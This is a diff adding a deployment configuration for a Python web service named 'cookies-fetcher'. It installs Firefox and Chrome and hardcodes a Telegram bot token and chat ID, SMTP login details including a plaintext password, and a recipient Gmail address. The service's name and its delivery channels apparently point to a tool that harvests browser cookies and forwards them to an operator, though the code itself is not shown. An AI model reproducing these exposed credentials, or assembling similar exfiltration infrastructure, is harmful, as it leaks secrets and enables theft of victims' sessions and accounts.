@@ -1,0 +1,28 @@
+services:
+  - type: web
+    name: cookies-fetcher
+    env: python
+    buildCommand: "pip install -r requirements.txt"
+    startCommand: "python app.py"
+    installCommand: |
+      apt-get update
+      apt-get install -y firefox wget gnupg2
+      wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | apt-key add -
+      echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google-chrome.list
+      apt-get update
+      apt-get install -y google-chrome-stable
+    envVars:
+      - key: TELEGRAM_BOT_TOKEN
+        value: '5444520238:AAHo9DY-sSdKi6wh36WEpTTLA2S5V6Pc5A8'
+      - key: TELEGRAM_CHAT_ID
+        value: '@blavkcap'
+      - key: SMTP_SERVER
+        value: 'smtp.hostinger.com'
+      - key: SMTP_PORT
+        value: '465'
+      - key: EMAIL_ADDRESS
+        value: 'mail@lbrealty.online'
+      - key: EMAIL_PASSWORD
+        value: 'Johnson8666@'
+      - key: RECIPIENT_EMAIL
+        value: 'mickeyprosper7@gmail.com'
